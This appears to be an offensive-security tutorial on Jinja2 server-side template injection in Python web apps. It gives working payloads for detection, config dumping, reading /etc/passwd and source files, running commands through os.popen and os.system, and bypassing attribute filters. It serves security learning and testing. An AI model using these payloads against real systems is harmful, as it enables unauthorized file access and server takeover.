---
title: Jinja2 Exploitation for SSTI Vulnerabilities
description: Explore Jinja2 SSTI vulnerabilities for file read and RCE in Python apps.
keywords:
- Jinja2
- SSTI
- Python
- remote code execution
- template engine
- web security
- file read
---

# Jinja2 Exploitation

## Context

Jinja2 is a popular template engine for Python, commonly used in web frameworks like Flask. This article focuses on leveraging Jinja2's Server-Side Template Injection (SSTI) vulnerabilities to exploit Python web applications. By the end, you'll be equipped to perform file reads and execute remote code, assuming a solid understanding of template engines, Python programming, web application architecture, and SSTI concepts.

## Theory

### Jinja2 Template Engine Internals

Jinja2 is a powerful template engine for Python that allows developers to embed logic and dynamically render web content. It processes templates using a context, which can include both static and user-supplied data. If input is not adequately sanitized, this feature can be manipulated to achieve code execution.

When attacker-controlled input is directly rendered, it may be evaluated as a Jinja2 template expression, leading to code execution vulnerabilities. This creates an attack surface ripe for exploitation.

### Accessing Python Internals via Jinja2

Jinja2 provides pathways to Python's internals through template expressions, allowing attackers to potentially access sensitive Python objects and methods. Attackers can chain attribute accessors to traverse object properties and reach sensitive components, such as `__globals__`. Crafting these chains carefully allows the circumvention of basic input filtering, such as using `[].__class__.__base__`.

### Jinja2 Remote Code Execution (RCE) Pathways

Attackers exploit Jinja2 by escalating from template variable manipulation to arbitrary code execution. This relies on accessing built-in Python functions within the template context, such as `os.popen` or `subprocess`, which offers command execution capabilities. Successful exploitation requires access to these or similar attributes.

### File Read via Jinja2 Injection

Jinja2's template context can be leveraged to read files from the server. By accessing file manipulation functions like `open()` through a Jinja2 injection, attackers can read sensitive server files. Exploiting this requires the template context to expose Python's file operation methods or allow the import of modules containing such methods.

## Practice

### Enumerate Jinja2 Injection and Context Exposure

Start by confirming the presence of a Jinja2 injection vulnerability and identifying exposed contexts:

- Use the payload `{{7*7}}` to test whether arbitrary expressions are evaluated. A return value of `49` confirms that injection is possible.
- Attempt to access configuration items with `{{config.items()}}`. This payload can reveal Flask's configuration if included within the template context.
- Enumerate available classes using `{{ [].__class__.__base__.__subclasses__() }}`, providing visibility into exploitable Python subclasses.

Outcome: Discover vulnerable injection points and assess accessible Python objects.

### File Read via Jinja2 Injection

Read server files using Jinja2's template context access:

- Execute `{{ cycler.__init__.__globals__.open('/etc/passwd').read() }}` to read the `/etc/passwd` file leveraging `open()` from `cycler`'s `__globals__`.
- Attempt to retrieve application source files with `{{ joiner.__init__.__globals__.open('app.py').read() }}` to view source code if accessible.

Outcome: Access and read sensitive data from the server's filesystem.

### Remote Code Execution via Jinja2 Injection

Achieve remote code execution by exploiting Jinja2 template injection:

- Execute system commands like `{{ cycler.__init__.__globals__.os.popen('id').read() }}` to obtain the user ID executing the application.
- Confirm execution context permissions using `{{ joiner.__init__.__globals__.os.popen('whoami').read() }}`.
- Test command execution efficacy with `{{ namespace.__init__.__globals__.os.system('touch /tmp/pwned') }}`, creating a file to prove execution.

Outcome: Gain remote code execution on the server, allowing arbitrary command execution.

### Bypass Attribute Filtering in Jinja2

Circumvent filtered attributes to aid in exploitation:

- Use `{{ [].__class__.__base__.__subclasses__() }}` to access subclass lists, permitting traversal to file or OS-related classes.
- Apply `{{ ''.__class__.__mro__[1].__subclasses__() }}` as an alternative subclass enumeration technique to bypass attribute filtering.

Outcome: Navigate around input validation restrictions to access protected Python internals.

## Tools

- **Burp Suite**
- **curl**
- **wfuzz**